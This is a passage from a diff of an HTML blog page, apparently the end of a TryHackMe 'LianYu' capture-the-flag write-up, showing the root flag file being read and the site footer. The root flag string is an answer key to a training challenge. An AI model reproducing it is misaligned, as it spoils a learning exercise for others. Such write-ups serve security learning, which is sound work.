+<p>now get the root flag</p>
+<pre tabindex="0"><code>root@LianYu:~# cat root.txt
+                          Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---&gt; Now slade Will become DEATHSTROKE. 
+
+
+
+THM{Marvel_comics_fans_got_hawkeye}
+                                                                              --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+</code></pre><p>And goodbye!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
